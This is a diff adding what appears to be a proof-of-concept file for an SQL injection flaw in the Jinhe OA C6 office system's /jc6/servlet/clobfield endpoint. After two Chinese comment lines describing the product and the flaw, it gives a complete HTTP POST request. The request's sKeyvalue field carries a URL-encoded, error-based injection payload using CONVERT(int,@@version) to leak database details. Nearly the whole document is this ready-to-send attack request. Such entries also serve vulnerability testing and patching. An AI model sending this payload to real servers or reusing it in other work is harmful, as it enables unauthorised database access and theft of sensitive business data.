@@ -1,0 +1,10 @@
+# 金和OA jc6 clobfield SQL注入漏洞
+# 金和OA是一款企业级办公自动化软件,旨在提供高效的办公流程管理和协作解决方案。C6协同系统存在SQL注入漏洞，攻击者可构造恶意请求获取数据库敏感数据。
+POST /jc6/servlet/clobfield?acid=80051405&bid=hd_tag_m8mv24rd HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24rd
+RM-PRO-Token: 10ff0018cb648a7740a3be71819c81b1
+RM-PRO-Time: 1742808407589
+User-Agent: curl/7.83.1
+
+key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11%27%2F**%2Fand%2F**%2FCONVERT%28int%2C%40%40version%29%3D1%2F**%2Fand%2F**%2F%27%27%3D%27
